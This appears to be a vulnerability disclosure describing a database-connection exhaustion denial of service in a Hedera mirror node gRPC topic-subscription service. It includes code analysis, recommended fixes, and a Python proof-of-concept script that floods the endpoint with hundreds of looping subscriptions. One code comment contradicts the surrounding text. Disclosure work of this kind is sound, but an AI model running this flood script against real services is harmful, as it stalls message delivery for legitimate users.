### Title
Unthrottled DB Poll Exhaustion via Unbounded Safety-Check Subscriptions Freezes HCS Message Delivery

### Summary
Every unprivileged `subscribeTopic` gRPC call unconditionally triggers a safety-check after 1 second that invokes the unthrottled retriever path (`retrieve(filter, false)`), which always executes all 12 DB polls at 20 ms intervals regardless of whether any data exists. Because there is no global connection limit, no per-IP rate limit, and no early-exit for empty results in the unthrottled `isComplete()` logic, an attacker opening thousands of concurrent subscriptions exhausts the HikariCP DB connection pool and stalls message delivery for all legitimate subscribers.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` unconditionally schedules a safety check for every subscription:

```java
// TopicMessageServiceImpl.java lines 67-70
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
    .filter(_ -> !topicContext.isComplete())
    .flatMapMany(_ -> missingMessages(topicContext, null))
    .subscribeOn(Schedulers.boundedElastic());
```

`TopicContext.isComplete()` (lines 203-215) returns `false` whenever `filter.getEndTime() == null`, which is the default for any open-ended subscription. So the safety check fires for every open-ended subscription without exception.

`missingMessages(topicContext, null)` (line 149) calls:
```java
return topicMessageRetriever.retrieve(gapFilter, false);  // unthrottled=false
```

Inside `PollingContext` constructor (lines 102-107), the unthrottled branch sets:
- `numRepeats = unthrottled.getMaxPolls()` → **12**
- `frequency = unthrottled.getPollingFrequency()` → **20 ms**
- `maxPageSize = unthrottled.getMaxPageSize()` → **5000**

The `retrieve()` method (lines 51-55) repeats `poll()` up to `numRepeats` times, gated by `!context.isComplete()`.

**Root cause — broken early-exit for unthrottled:**

`PollingContext.isComplete()` (lines 121-128):
```java
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;  // unthrottled: ONLY stops on limit hit
}
```

The throttled path short-circuits when the last page was smaller than `maxPageSize` (i.e., end of data). The unthrottled path has **no such check**. The safety-check filter carries no limit (`filter.hasLimit()` is false), so `limitHit` is always `false`, and `isComplete()` always returns `false`. All 12 polls execute unconditionally, each issuing a blocking DB query via `Flux.fromStream(topicMessageRepository.findByFilter(newFilter))` (line 78).

**No global connection gate:**

`NettyProperties.maxConcurrentCallsPerConnection = 5` (line 14 of `NettyProperties.java`) limits calls per TCP connection, but there is no limit on the number of TCP connections. No IP-based rate limiting exists in the gRPC layer. `subscriberCount` (line 48 of `TopicMessageServiceImpl`) is a metric gauge only — it is never checked to reject new subscriptions.

### Impact Explanation

Each attacker subscription holds or queues up to 12 HikariCP connections over 240 ms. The default HikariCP pool for the gRPC service is small (Spring Boot default: 10 connections). With a few hundred concurrent attacker subscriptions, the pool is fully saturated. Legitimate subscribers' throttled historical retriever calls (`retrieve(filter, true)`) and gap-recovery calls also require DB connections and will queue indefinitely or timeout (default 60 s). This stalls delivery of HCS topic messages — including those carrying fund-transfer confirmations — for all active subscribers for the duration of the attack. The attacker can sustain the condition by continuously cycling new connections, since each unthrottled burst completes in ~240 ms and the attacker can immediately reconnect.

### Likelihood Explanation

No authentication is required to call `subscribeTopic` — the gRPC endpoint is publicly accessible. The attacker needs only a standard gRPC client and the ability to open many TCP connections (trivially achievable from a single host or a small botnet). The attack is fully repeatable: each 240 ms burst is self-contained, and the attacker can loop indefinitely. The `maxConcurrentCallsPerConnection = 5` constraint is easily bypassed by opening more connections. No special knowledge of the system internals is required beyond knowing the topic ID of any valid HCS topic.

### Recommendation

1. **Fix `isComplete()` for unthrottled**: Apply the same page-size short-circuit used by the throttled path. If the last page returned fewer rows than `maxPageSize`, the unthrottled path should also terminate early:
   ```java
   return pageSize.get() < unthrottled.getMaxPageSize() || limitHit;
   ```
2. **Enforce a global concurrent-subscriber cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
3. **Add per-IP or per-connection rate limiting** at the gRPC interceptor layer to limit the rate of new `subscribeTopic` calls.
4. **Increase HikariCP pool size** and set an explicit `connectionTimeout` short enough to fail fast rather than queue indefinitely under load.
5. **Bound the safety-check trigger**: Only fire the safety check if the subscription has actually received at least one message (i.e., `topicContext.getLast() != null`), or add a per-subscription cooldown.

### Proof of Concept

```python
import grpc, threading, time
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD,
                                        realmNum=TOPIC_REALM,
                                        topicNum=TOPIC_NUM),
        # No consensusEndTime → open-ended → TopicContext.isComplete() always false
        # No limit → PollingContext.isComplete() always false → all 12 polls fire
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass
    except Exception:
        pass
    channel.close()

# Step 1: Open 500 concurrent subscriptions from separate connections
# Each triggers safety check after 1s → 12 unthrottled DB polls × 500 = 6000 concurrent queries
# HikariCP pool (default 10) is exhausted; legitimate subscribers stall

threads = [threading.Thread(target=flood) for _ in range(500)]
for t in threads: t.start()

# Step 2: Continuously recycle to sustain exhaustion
while True:
    time.sleep(0.2)  # 240ms burst window
    new_threads = [threading.Thread(target=flood) for _ in range(500)]
    for t in new_threads: t.start()
```

**Expected result**: Within seconds, `hikaricp_connections_pending` metric spikes to pool maximum; legitimate subscribers receive no messages or timeout errors; the `GrpcHighDBConnections` alert (threshold 75%) fires.
